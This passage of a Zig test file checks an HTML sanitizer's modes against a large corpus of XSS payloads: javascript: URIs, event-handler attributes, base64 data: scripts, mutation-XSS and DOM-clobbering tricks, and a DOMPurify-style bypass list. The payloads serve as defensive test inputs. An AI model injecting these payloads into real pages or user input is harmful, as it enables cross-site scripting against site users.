        try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);

        // Should preserve pre/code elements and text content
        try testing.expect(std.mem.indexOf(u8, result, "<pre") != null);
        try testing.expect(std.mem.indexOf(u8, result, "<code") != null);
        try testing.expect(std.mem.indexOf(u8, result, "Node.clone()") != null);
        try testing.expect(std.mem.indexOf(u8, result, "function dangerous()") != null);
        // But script tags inside pre should still be removed
        try testing.expect(std.mem.indexOf(u8, result, "pre-script") == null);
    }

    // Test 4: .custom mode (preserve comments, allow scripts, allow custom elements)
    {
        const doc = try z.parseHTML(allocator, comprehensive_malicious_html);
        defer z.destroyDocument(doc);
        const body = z.bodyNode(doc).?;

        try sanitizeWithMode(allocator, body, .{
            .custom = SanitizerOptions{
                .skip_comments = false, // Preserve comments
                .remove_scripts = false, // Allow scripts
                .remove_styles = true, // Remove styles
                .strict_uri_validation = false, // Allow more URIs
                .allow_custom_elements = true, // Allow custom elements
            },
        });

        const result = try z.outerNodeHTML(allocator, body);
        defer allocator.free(result);

        // Should preserve comments and scripts
        try testing.expect(std.mem.indexOf(u8, result, "malicious comment") != null);
        try testing.expect(std.mem.indexOf(u8, result, "script") != null);

        // Should preserve custom elements
        try testing.expect(std.mem.indexOf(u8, result, "phoenix-component") != null);
        try testing.expect(std.mem.indexOf(u8, result, "my-button") != null);
        try testing.expect(std.mem.indexOf(u8, result, "vue-component") != null);

        // Should still remove styles (as configured)
        try testing.expect(std.mem.indexOf(u8, result, "<style") == null);

        // Should preserve pre/code elements and all text content (including scripts if configured)
        try testing.expect(std.mem.indexOf(u8, result, "<pre") != null);
        try testing.expect(std.mem.indexOf(u8, result, "<code") != null);
        try testing.expect(std.mem.indexOf(u8, result, "Node.clone()") != null);
        try testing.expect(std.mem.indexOf(u8, result, "push()") != null);
        try testing.expect(std.mem.indexOf(u8, result, "function dangerous()") != null);
        // In custom mode with scripts allowed, might preserve script content
        // (but the script tags themselves might still be parsed/handled)
    }
}

test "iframe sandbox validation" {
    const allocator = testing.allocator;

    const test_html =
        \\<iframe sandbox src="https://example.com">Safe iframe</iframe>
        \\<iframe src="https://example.com">Unsafe - no sandbox</iframe>
        \\<iframe sandbox src="javascript:alert('XSS')">Unsafe - dangerous src</iframe>
        \\<iframe sandbox>Safe - empty sandbox, no src</iframe>
    ;

    const doc = try z.parseHTML(allocator, test_html);
    defer z.destroyDocument(doc);
    const body = z.bodyNode(doc).?;

    try sanitizeStrict(allocator, body);

    // Minify to clean up whitespace left by element removal
    const body_element = z.nodeToElement(body) orelse return;
    try z.minifyDOM(allocator, body_element);

    const result = try z.outerNodeHTML(allocator, body);
    defer allocator.free(result);

    const expected = "<body><iframe sandbox src=\"https://example.com\">Safe iframe</iframe><iframe sandbox>Safe - empty sandbox, no src</iframe></body>";
    try testing.expectEqualStrings(expected, result);
}

test "DOMParser.parseAndAppendFragment with improved logic" {
    const allocator = testing.allocator;

    const doc = try z.createDocument();
    defer z.destroyDocument(doc);

    var parser = try z.DOMParser.init(allocator);
    defer parser.deinit();

    const malicious_content = "<script>alert('XSS')</script><img src=\"data:text/html,<script>alert('XSS')</script>\" alt=\"escaped\"><p id=\"1\" phx-click=\"increment\" onclick=\"alert('XSS')\">Click me</p><a href=\"http://example.org/results?search=<img src=x onerror=alert('hello')>\">URL Escaped</a><x-widget><button onclick=\"increment\">Click</button></x-widget>";

    const result0 = "<script>alert('XSS')</script><img src=\"data:text/html,&lt;script&gt;alert('XSS')&lt;/script&gt;\" alt=\"escaped\"><p id=\"1\" phx-click=\"increment\" onclick=\"alert('XSS')\">Click me</p><a href=\"http://example.org/results?search=&lt;img src=x onerror=alert('hello')&gt;\">URL Escaped</a><x-widget><button onclick=\"increment\">Click</button></x-widget>";

    // Permissive mode removes dangerous attributes (onclick) but keeps the element and safe attributes.
    const result1 = "<img alt=\"escaped\"><p id=\"1\" phx-click=\"increment\">Click me</p><a href=\"http://example.org/results?search=&lt;img src=x onerror=alert('hello')&gt;\">URL Escaped</a><x-widget><button>Click</button></x-widget>";

    const result2 = "<img alt=\"escaped\"><p id=\"1\">Click me</p><a href=\"http://example.org/results?search=&lt;img src=x onerror=alert('hello')&gt;\">URL Escaped</a>";

    const expectations = [_]struct { name: []const u8, result: []const u8, mode: z.SanitizerMode }{
        .{ .name = "flavor0", .result = result0, .mode = .none },
        .{ .name = "flavor1", .result = result1, .mode = .permissive },
        .{ .name = "flavor2", .result = result2, .mode = .strict },
    };

    for (expectations) |exp| {
        const div_elt = try z.createElement(doc, "div");
        defer z.destroyNode(z.elementToNode(div_elt));

        try parser.parseAndAppendFragment(
            div_elt,
            malicious_content,
            .body,
            exp.mode,
        );
        const inner = try z.innerHTML(allocator, div_elt);
        defer allocator.free(inner);

        // std.debug.print("\n-------{}\n", .{i});
        // try z.prettyPrint(allocator, z.elementToNode(div_elt));
        try testing.expectEqualStrings(exp.result, inner);
        try z.setInnerHTML(div_elt, ""); // Clear for next iteration
    }
}

test "parseFromStringInContext + appendFragment with options" {
    const allocator = testing.allocator;

    const doc = try z.parseHTML(allocator, "<div id=\"1\"></div>");
    defer z.destroyDocument(doc);
    const div_elt = z.getElementById(doc, "1").?;

    var parser = try z.DOMParser.init(allocator);
    defer parser.deinit();

    const html1 = "<p> some text</p>";
    const frag_root1 = try parser.parseFromStringInContext(
        html1,
        doc,
        .body,
        .strict,
    );

    const html2 = "<div> more <i>text</i><span><script>alert(1);</script></span></div>";
    const frag_root2 = try parser.parseFromStringInContext(
        html2,
        doc,
        .div,
        .strict,
    );

    const html3 = "<ul><li><script>alert(1);</script></li></ul>";
    const frag_root3 = try parser.parseFromStringInContext(
        html3,
        doc,
        .div,
        .strict,
    );

    const html4 = "<a href=\"http://example.org/results?search=<img src=x onerror=alert('hello')>\">URL Escaped</a>";
    const frag_root4 = try parser.parseFromStringInContext(
        html4,
        doc,
        .div,
        .permissive,
    );

    // append fragments and check the result

    const div: *z.DomNode = @ptrCast(div_elt);
    try z.appendFragment(div, frag_root1);
    try z.appendFragment(div, frag_root2);
    try z.appendFragment(div, frag_root3);
    try z.appendFragment(div, frag_root4);

    const result = try z.outerHTML(allocator, div_elt);
    defer allocator.free(result);

    const expected = "<div id=\"1\"><p> some text</p><div> more <i>text</i><span></span></div><ul><li></li></ul><a href=\"http://example.org/results?search=&lt;img src=x onerror=alert('hello')&gt;\">URL Escaped</a></div>";
    // try z.prettyPrint(allocator, z.documentRoot(doc).?);

    try testing.expectEqualStrings(expected, result);
}

test "all-in-one: parseAndAppendFragment with sanitization option" {
    const allocator = testing.allocator;

    var parser = try z.DOMParser.init(allocator);
    defer parser.deinit();
    const doc = try parser.parseFromString("<div id=\"1\"></div>");
    defer z.destroyDocument(doc);

    const html1 = "<p> some text</p>";
    const html2 = "<div> more <i>text</i><span><script>alert(1);</script></span></div>";
    const html3 = "<ul><li><script>alert(1);</script></li></ul>";

    const div_elt = z.getElementById(doc, "1").?;
    // const div: *z.DomNode = @ptrCast(div_elt);

    // append fragments and check the result
    try parser.parseAndAppendFragment(div_elt, html1, .div, .permissive);
    try parser.parseAndAppendFragment(div_elt, html2, .div, .strict);
    try parser.parseAndAppendFragment(div_elt, html3, .div, .strict);

    const result = try z.outerHTML(allocator, div_elt);
    defer allocator.free(result);

    const expected = "<div id=\"1\"><p> some text</p><div> more <i>text</i><span></span></div><ul><li></li></ul></div>";
    try testing.expectEqualStrings(expected, result);
}

test "Serializer sanitation" {
    const allocator = testing.allocator;

    const malicious_content =
        \\ <div>
        \\  <button disabled hidden onclick="alert('XSS')" phx-click="increment">Potentially dangerous, not escaped</button>
        \\  <!-- a comment -->
        \\  <div data-time="{@current}"> The current value is: {@counter} </div>
        \\  <a href="http://example.org/results?search=<img src=x onerror=alert('hello')>">URL Escaped</a>
        \\  <a href="javascript:alert('XSS')">Dangerous, not escaped</a>
        \\  <img src="javascript:alert('XSS')" alt="not escaped">
        \\  <iframe src="javascript:alert('XSS')" alt="not escaped"></iframe>
        \\  <a href="data:text/html,<script>alert('XSS')</script>" alt="escaped">Safe escaped</a>
        \\  <img src="data:text/html,<script>alert('XSS')</script>" alt="escaped">
        \\  <iframe src="data:text/html,<script>alert('XSS')</script>" >Escaped</iframe>
        \\  <img src="data:image/svg+xml,<svg onload=alert('XSS')" alt="escaped"></svg>\">
        \\  <img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUycpPjwvc3ZnPg==" alt="potential dangerous b64">
        \\  <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Potential dangerous b64</a>
        \\  <img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=" alt="potential dangerous b64">
        \\  <a href="file:///etc/passwd">Dangerous Local file access</a><img src="file:///etc/passwd" alt="dangerous local file access">
        \\  <p>Hello<i>there</i>, all<strong>good?</strong></p>
        \\  <p>Visit this link: <a href="https://example.com">example.com</a></p>
        \\</div>
        \\<link href="/shared-assets/misc/link-element-example.css" rel="stylesheet">
        \\<script>console.log("hi");</script>
        \\<template><p>Inside template</p></template>
        \\<custom-element><script> console.log("hi");</script></custom-element>
    ;

    var parser = try z.DOMParser.init(allocator);
    defer parser.deinit();

    // Test 1: .strict mode
    {
        const doc = try parser.parseFromString("");
        defer z.destroyDocument(doc);
        const body = z.bodyNode(doc).?;

        try parser.parseAndAppendFragment(
            z.nodeToElement(body).?,
            malicious_content,
            .div,
            .strict,
        );

        const final_html = try z.outerNodeHTML(allocator, body);
        defer allocator.free(final_html);
        // z.print("T1: .strict -----------\n", .{});
        // try z.prettyPrint(allocator, body);

        // Should remove dangerous content
        try testing.expect(std.mem.indexOf(u8, final_html, "javascript") == null);
        try testing.expect(std.mem.indexOf(u8, final_html, "onclick") == null);
        try testing.expect(std.mem.indexOf(u8, final_html, "<script>") == null);
        try testing.expect(std.mem.indexOf(u8, final_html, "custom-element") == null); // Custom elements removed in strict

        // Should preserve safe content
        try testing.expect(std.mem.indexOf(u8, final_html, "Hello") != null);
        try testing.expect(std.mem.indexOf(u8, final_html, "example.com") != null);
        try testing.expect(std.mem.indexOf(u8, final_html, "<strong>") != null);
    }
    // Test 2: .permissive mode
    {
        const doc = try parser.parseFromString("");
        defer z.destroyDocument(doc);
        const body = z.bodyNode(doc).?;
        try parser.parseAndAppendFragment(
            z.nodeToElement(body).?,
            malicious_content,
            .div,
            .permissive,
        );

        const final_html = try z.outerNodeHTML(allocator, body);
        defer allocator.free(final_html);
        // z.print("T2: .permissive -----------\n", .{});
        // try z.prettyPrint(allocator, z.bodyNode(doc).?);

        // Should still remove dangerous content
        try testing.expect(std.mem.indexOf(u8, final_html, "javascript") == null);
        try testing.expect(std.mem.indexOf(u8, final_html, "onclick") == null);
        try testing.expect(std.mem.indexOf(u8, final_html, "<script>") == null);

        // But should preserve custom elements
        try testing.expect(std.mem.indexOf(u8, final_html, "custom-element") != null);

        // Should preserve safe content and framework attributes
        try testing.expect(std.mem.indexOf(u8, final_html, "phx-click") != null);
        try testing.expect(std.mem.indexOf(u8, final_html, "Hello") != null);
    }
    // Test 3: .none mode
    {
        const doc = try parser.parseFromString("");
        defer z.destroyDocument(doc);
        const body = z.bodyNode(doc).?;
        try parser.parseAndAppendFragment(
            z.nodeToElement(body).?,
            malicious_content,
            .div,
            .none,
        );

        const final_html = try z.outerNodeHTML(allocator, body);
        defer allocator.free(final_html);
        // z.print("T3: .none -----------\n", .{});
        // try z.prettyPrint(allocator, z.bodyNode(doc).?);

        // Should preserve most content including scripts and custom elements
        try testing.expect(std.mem.indexOf(u8, final_html, "<script>") != null);
        try testing.expect(std.mem.indexOf(u8, final_html, "custom-element") != null);
        try testing.expect(std.mem.indexOf(u8, final_html, "<!-- a comment -->") != null);

        // Should preserve safe content
        try testing.expect(std.mem.indexOf(u8, final_html, "Hello") != null);
        try testing.expect(std.mem.indexOf(u8, final_html, "<template>") != null);
    }
    // Test 4: .custom mode
    {
        const doc = try parser.parseFromString("");
        defer z.destroyDocument(doc);
        const body = z.bodyNode(doc).?;
        try parser.parseAndAppendFragment(
            z.nodeToElement(body).?,
            malicious_content,
            .div,
            .{
                .custom = .{
                    .allow_custom_elements = true,
                    .skip_comments = false, // Preserve comments
                    .remove_scripts = false, // Allow scripts to demonstrate flexibility
                    .remove_styles = true,
                    .strict_uri_validation = false,
                    .allow_framework_attrs = true,
                },
            },
        );

        const final_html = try z.outerNodeHTML(allocator, body);
        defer allocator.free(final_html);
        // z.print("T4: .custom ----------------------\n", .{});
        // try z.prettyPrint(allocator, z.bodyNode(doc).?);

        // Should preserve comments and custom elements
        try testing.expect(std.mem.indexOf(u8, final_html, "<!-- a comment -->") != null);
        try testing.expect(std.mem.indexOf(u8, final_html, "custom-element") != null);

        // Should preserve scripts and allow more URIs (as configured)
        try testing.expect(std.mem.indexOf(u8, final_html, "<script>") != null);
        // javascript: URIs might still be filtered at parser level

        // Should preserve safe content and framework attributes
        try testing.expect(std.mem.indexOf(u8, final_html, "phx-click") != null);
        try testing.expect(std.mem.indexOf(u8, final_html, "Hello") != null);
    }
}

test "namespace emixing SVG with HTML" {
    const input =
        \\<svg>
        \\  <foreignObject>
        \\      <div onclick="alert(1)">Click me</div>
        \\      <p>Safe paragraph</p>
        \\  </foreignObject>
        \\</svg>
    ;
    const _expect =
        \\<svg></svg>
    ;

    const allocator = testing.allocator;
    const expect = try z.minifyHtmlString(allocator, _expect);
    defer allocator.free(expect);

    try quickCheck(allocator, input, expect);
}

test "SVG filer with JS URL" {
    const input =
        \\<svg>
        \\    <filter id="f">
        \\        <feImage xlink:href="javascript:alert(1)"/>
        \\    </filter>
        \\    <rect filter="url(#f)" width="100" height="100"/>
        \\</svg>
    ;

    const _expect =
        \\<svg>
        \\    <filter id="f">
        \\    </filter>
        \\    <rect filter="url(#f)" width="100" height="100"></rect>
        \\</svg>
    ;

    const allocator = testing.allocator;
    const expect = try z.minifyHtmlString(allocator, _expect);
    defer allocator.free(expect);

    try quickCheck(allocator, input, expect);
}

test "MAthML - maciton elt" {
    const input =
        \\<math>
        \\    <maction actiontype="statusline" xlink:href="javascript:alert(1)">
        \\        Click me
        \\    </maction>
        \\</math>
    ;

    const _expect =
        \\<math>
        \\        Click me
        \\</math>
    ;

    const allocator = testing.allocator;
    const expect = try z.minifyHtmlString(allocator, _expect);
    defer allocator.free(expect);
    const reality = "<math></math>";
    try quickCheck(allocator, input, reality);
}

test "Style filter" {
    const input =
        \\<div style="width:1px;filter:glow onfilterchange=alert(70)">x</div>
        \\<div style="width:2px" >y</div>
    ;

    const _expect =
        \\<div style="width: 1px">x</div><div style="width: 2px">y</div>
    ;

    const allocator = testing.allocator;
    const expect = try z.minifyHtmlString(allocator, _expect);
    defer allocator.free(expect);

    try quickCheck(allocator, input, expect);
}

fn quickCheck(allocator: std.mem.Allocator, input: []const u8, expect: []const u8) !void {
    const doc = try z.parseHTML(allocator, input);
    defer z.destroyDocument(doc);

    // Initialize CSS sanitizer to preserve harmless inline styles
    var css_sanitizer = try CssSanitizer.init(allocator, .{});
    defer css_sanitizer.deinit();

    // Use strict mode but with CSS sanitization instead of style removal
    const custom_mode = SanitizerMode{
        .custom = SanitizerOptions{
            .skip_comments = true,
            .remove_scripts = true,
            .remove_styles = false, // Allow styles but sanitize them
            .sanitize_inline_styles = true, // Sanitize inline styles with CSS parser
            .strict_uri_validation = true,
            .allow_custom_elements = false,
            .allow_framework_attrs = false,
            .sanitize_dom_clobbering = true,
        },
    };

    try sanitizeWithCss(allocator, z.bodyNode(doc).?, custom_mode, &css_sanitizer);
    const innerHTML = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(innerHTML);
    // try z.prettyPrint(allocator, z.bodyNode(doc).?);
    const reality = try z.minifyHtmlString(allocator, innerHTML);
    defer allocator.free(reality);
    // z.print("{s}\n", .{reality});
    try testing.expectEqualStrings(expect, reality);
}

test "dom_purify" {
    const dirty =
        \\    <!-- I am ready now, click one of the buttons! -->
        \\<svg><image id="v-146" width="500" height="500" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E" preserveratio="true" style="border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;"></image></svg>
        \\
        \\<svg><image id="v-146" width="500" height="500" xmlns:xlink="http://www.w3.org/1999/xlink" href="data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E" preserveratio="true" style="border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;"></image></svg>
        \\
        \\<div aria-labelledby="msg--title" role="dialog" class="msg"><button class="modal-close" aria-label="close" type="button"><i class="icon-close"></i>some button</button></div>
        \\
        \\<input type=checkbox checked><input type=checkbox onclick>
        \\
        \\<svg><defs><filter id="f1"><feGaussianBlur in="SourceGraphic" stdDeviation="15" /></filter></defs><rect width="90" height="90" stroke="green" stroke-width="3" fill="yellow" filter="url(#f1)" /></svg>
        \\
        \\<b href="javascript:alert(1)" title="javascript:alert(2)"></b>
        \\
        \\<img src="data:,123"><audio src="data:,456"></audio><video src="data:,789"></video><source src="data:,012"><div src="data:,345">
        \\
        \\<img src=x name=createElement><img src=y id=createElement>
        \\
        \\<img src=x name=cookie>
        \\
        \\123<a href=' javascript:alert(1)'>I am a dolphin!</a>
        \\
        \\123<a href=' javascript:alert(1)'>I am a dolphin too!</a>
        \\
        \\123<a href=' javascript:alert(1)'>CLICK</a><a href='&#xA0javascript:alert(1)'>CLICK</a><a href='&#x1680;javascript:alert(1)'>CLICK</a><a href='&#x180E;javascript:alert(1)'>CLICK</a><a href='&#x2000;javascript:alert(1)'>CLICK</a><a href='&#x2001;javascript:alert(1)'>CLICK</a><a href='&#x2002;javascript:alert(1)'>CLICK</a><a href='&#x2003;javascript:alert(1)'>CLICK</a><a href='&#x2004;javascript:alert(1)'>CLICK</a><a href='&#x2005;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2007;javascript:alert(1)'>CLICK</a><a href='&#x2008;javascript:alert(1)'>CLICK</a><a href='&#x2009;javascript:alert(1)'>CLICK</a><a href='&#x200A;javascript:alert(1)'>CLICK</a><a href='&#x200B;javascript:alert(1)'>CLICK</a><a href='&#x205f;javascript:alert(1)'>CLICK</a><a href='&#x3000;javascript:alert(1)'>CLICK</a>
        \\
        \\<img src=data:image/jpeg,ab798ewqxbaudbuoibeqbla>
        \\
        \\<img src="
        \\data:image/jpeg,ab798ewqxbaudbuoibeqbla">
        \\
        \\<img src='javascript:while(1){}'>
        \\
        \\<a href=data:,evilnastystuff>clickme</a>
        \\
        \\123456
        \\
        \\<form onmouseover='alert(1)'><input name="attributes"><input name="attributes">
        \\
        \\<img src=x name=getElementById>
        \\
        \\<a href="#some-code-here" id="location">invisible
        \\
        \\<div onclick=alert(0)><form onsubmit=alert(1)><input onfocus=alert(2) name=parentNode>123</form></div>
        \\
        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeName>123</form>
        \\
        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeType>123</form>
        \\
        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=children>123</form>
        \\
        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=attributes>123</form>
        \\
        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=removeChild>123</form>
        \\
        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=removeAttributeNode>123</form>
        \\
        \\<form onsubmit=alert(1)><input onfocus=alert(2) name=setAttribute>123</form>
        \\
        \\<style>*{color: red}</style>
        \\
        \\<p>hello</p>
        \\
        \\<listing>&lt;img onerror="alert(1);//" src=x&gt;<t t></listing>
        \\
        \\<img src=x id/=' onerror=alert(1)//'>
        \\
        \\<textarea>@shafigullin</textarea><!--</textarea><img src=x onerror=alert(1)>-->
        \\
        \\<b><noscript><!-- </noscript><img src=x onerror=alert(1) --></noscript>
        \\
        \\<b><noscript><a alt="</noscript><img src=x onerror=alert(1)>"></noscript>
        \\
        \\<body><template><s><template><s><img src=x onerror=alert(1)>@shafigullin</s></template></s></template>
        \\
        \\<a href="javascript:alert(1)">@shafigullin<a>
        \\
        \\<option><style></option></select><b><img src=x onerror=alert(1)></style></option>
        \\
        \\<option><iframe></select><b><script>alert(1)</script>
        \\
        \\</iframe></option>
        \\
        \\<b><style><style/><img src=x onerror=alert(1)>
        \\
        \\<b><style><style////><img src=x onerror=alert(1)></style>
        \\
        \\<math xmlns="http://www.w3.org/1998/Math/MathML" display="block">
        \\  <mrow>
        \\    <menclose notation="box"><mi>a</mi></menclose><mo>,</mo>
        \\    <menclose notation="box"><mi mathcolor="#FF0000">a</mi></menclose><mo>,</mo>
        \\    <menclose notation="box" mathcolor="#FF0000"><mi>a</mi></menclose><mo>,</mo>
        \\    <menclose notation="box" mathbackground="#80FF80"><mi mathcolor="#FF0000">a</mi></menclose><mo>,</mo>
        \\    <menclose notation="box" mathcolor="#FF0000" mathbackground="#80FF80"><mi>a</mi></menclose><mo>,</mo>
        \\    <menclose notation="box"><mi mathbackground="#80FF80">a</mi></menclose>
        \\  </mrow>
        \\</math>
        \\
        \\<image name=body><image name=adoptNode>@mmrupp<image name=firstElementChild><svg onload=alert(1)>
        \\
        \\<a href="javascript:alert(1)">@shafigullin<a>
        \\
        \\<image name=activeElement><svg onload=alert(1)>
        \\
        \\<image name=body><img src=x><svg onload=alert(1); autofocus>, <keygen onfocus=alert(1); autofocus>
        \\
        \\<div onmouseout="javascript:alert(/superevr/)" x=yscript: n>@superevr</div>
        \\
        \\<button remove=me onmousedown="javascript:alert(1);" onclick="javascript:alert(1)" >@giutro
        \\
        \\<a href="javascript:123" onclick="alert(1)">CLICK ME (bypass by @shafigullin)</a>
        \\
        \\<isindex x="javascript:" onmouseover="alert(1)" label="variation of bypass by @giutro">
        \\
        \\<div wow=removeme onmouseover=alert(1)>text
        \\
        \\<input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert(1)></svg>
        \\
        \\<isindex src="javascript:" onmouseover="alert(1)" label="bypass by @giutro" />
        \\
        \\<a href="javascript:123" onclick="alert(1)">CLICK ME (bypass by @shafigullin)</a>
        \\
        \\<form action="javasc
        \\ript:alert(1)"><button>XXX</button></form>
        \\
        \\<div id="1"><form id="foobar"></form><button form="foobar" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div>
        \\
        \\<div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div>
        \\
        \\<div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div>
        \\
        \\<div id="4">0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//["'`-->]]>]</div>
        \\
        \\<div id="5"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//["'`-->]]>]</div>
        \\
        \\<div id="6"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//["'`-->]]>]</div>
        \\
        \\<div id="7"><input onfocus=alert(7) autofocus>//["'`-->]]>]</div>
        \\
        \\<div id="8"><input onblur=alert(8) autofocus><input autofocus>//["'`-->]]>]</div>
        \\
        \\<div id="9"><a style="-o-link:'javascript:alert(9)';-o-link-source:current">X</a>//["'`-->]]>]</div>
        \\
        \\<div id="10"><video poster=javascript:alert(10)//></video>//["'`-->]]>]</div>
        \\
        \\<div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(11)"></g></svg>//["'`-->]]>]</div>
        \\
        \\<div id="12"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//["'`-->]]>]</div>
        \\
        \\<div id="13"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>//["'`-->]]>]</div>
        \\
        \\<div id="14"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//["'`-->]]>]</div>
        \\
        \\<div id="15"><script>({0:#0=alert/#0#/#0#(0)})</script>//["'`-->]]>]</div>
        \\
        \\<div id="16">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//["'`-->]]>]</div>
        \\
        \\<div id="17"><?xml-stylesheet href="javascript:alert(17)"?><root/>//["'`-->]]>]</div>
        \\
        \\<div id="18"><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>//["'`-->]]>]</div>
        \\
        \\<div id="19"><meta charset="x-mac-farsi">¼script ¾alert(19)//¼/script ¾//["'`-->]]>]</div>
        \\
        \\<div id="20"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//["'`-->]]>]</div>
        \\
        \\<div id="21"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//["'`-->]]>]</div>
        \\
        \\<div id="22"><input onblur=focus() autofocus><input>//["'`-->]]>]</div>
        \\
        \\<div id="23"><form id=foobar onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//["'`-->]]>]</div>
        \\
        \\<div id="24">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`behAvior:url(#default#time2)` attributename=`innerhtml` to=`<img/src="x"onerror=alert(24)>`>//["'`-->]]>]</div>
        \\
        \\<div id="25"><script src="#">{alert(25)}</script>;1//["'`-->]]>]</div>
        \\
        \\<div id="26">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//["'`-->]]>]</div>
        \\
        \\<div id="27"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["'`-->]]>]</div><div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=<img/src="."onerror=alert(28)>>//["'`-->]]>]</div>
        \\
        \\<div id="29"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//["'`-->]]>]</div>
        \\
        \\<div id="30"><style>@import "data:,*%7bx:expression(alert(30))%7D";</style>//["'`-->]]>]</div>
        \\
        \\<div id="31"><frameset onload=alert(31)>//["'`-->]]>]</div>
        \\
        \\<div id="32"><table background="javascript:alert(32)"></table>//["'`-->]]>]</div>
        \\
        \\<div id="33"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(33);">XXX</a></a><a href="javascript:alert(2)">XXX</a>//["'`-->]]>]</div>
        \\
        \\<div id="34">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//["'`-->]]>]</div>
        \\
